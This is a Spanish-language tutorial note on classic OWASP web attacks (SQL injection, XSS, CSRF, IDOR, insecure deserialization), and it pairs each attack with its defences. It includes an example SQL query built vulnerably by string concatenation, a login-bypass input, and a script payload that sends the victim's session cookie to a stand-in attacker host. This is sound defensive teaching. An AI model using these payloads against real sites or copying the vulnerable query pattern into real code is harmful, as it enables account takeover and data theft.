# Ataques web (OWASP Top 10, los clásicos)

## SQL Injection (SQLi)

**Qué es**: cuando una aplicación construye una consulta SQL concatenando
directamente la entrada del usuario, el atacante puede inyectar SQL propio.

```python
# VULNERABLE
query = f"SELECT * FROM usuarios WHERE nombre = '{nombre}' AND clave = '{clave}'"
# Si nombre = "admin' -- ", la parte de la clave queda comentada:
# SELECT * FROM usuarios WHERE nombre = 'admin' -- ' AND clave = '...'
```

Con eso, un atacante entra como `admin` sin conocer la contraseña. Variantes
más avanzadas permiten leer tablas enteras (`UNION SELECT`), o incluso
ejecutar comandos en el servidor según el motor de BD.

**Defensa**: **consultas parametrizadas / prepared statements** siempre (la
librería separa el código SQL de los datos, así que la entrada nunca se
interpreta como SQL). Nunca construir SQL con f-strings/concatenación.
El demo `demos/web-vulnerabilities/sqli_demo.py` muestra ambas versiones
contra la misma base SQLite local, una vulnerable y otra parametrizada.

## Cross-Site Scripting (XSS)

**Qué es**: cuando una app muestra entrada del usuario sin "escapar" HTML,
el atacante puede inyectar JavaScript que se ejecuta en el navegador de
*otra* persona que ve esa página (robar su cookie de sesión, hacer acciones
en su nombre, etc.).

```html
<!-- Si esto se inserta sin escapar en la página de otro usuario: -->
<script>fetch('https://atacante.com/robo?c=' + document.cookie)</script>
```

**Tipos**: reflejado (el payload viene en la URL/petición y se refleja al
instante), almacenado (el payload queda guardado en la BD, ej. en un
comentario, y afecta a todo el que lo vea), y basado en DOM (el JS del
propio cliente inserta el HTML de forma insegura).

**Defensa**: escapar/codificar toda salida dinámica según el contexto
(HTML, atributo, JS), usar frameworks modernos que escapan por defecto
(React, Vue), **Content-Security-Policy** para limitar qué scripts pueden
ejecutarse, y cookies de sesión con flag `HttpOnly` (así JS no puede leerlas
aunque haya XSS).

## Cross-Site Request Forgery (CSRF)

**Qué es**: un sitio malicioso hace que el navegador de la víctima envíe una
petición a un sitio donde SÍ está autenticada (el navegador manda las
cookies automáticamente), ejecutando una acción no deseada (ej. transferir
dinero) sin que la víctima se dé cuenta.

**Defensa**: tokens CSRF únicos por sesión/formulario, cookies con
`SameSite=Lax/Strict`, y requerir reautenticación para acciones sensibles.

## Otros comunes (mención rápida)

- **IDOR** (Insecure Direct Object Reference): cambiar un ID en la URL
  (`/factura/1002` → `/factura/1003`) y acceder a datos de otro usuario
  porque el backend no valida permisos, solo existencia. Defensa: verificar
  autorización en cada acceso, no solo autenticación.
- **Deserialización insegura**: deserializar datos no confiables puede
  ejecutar código arbitrario según el lenguaje/librería. Defensa: no
  deserializar entrada no confiable, o usar formatos sin ejecución de código
  (JSON) en vez de formatos con "gadgets" (pickle de Python, serialización de
  Java).
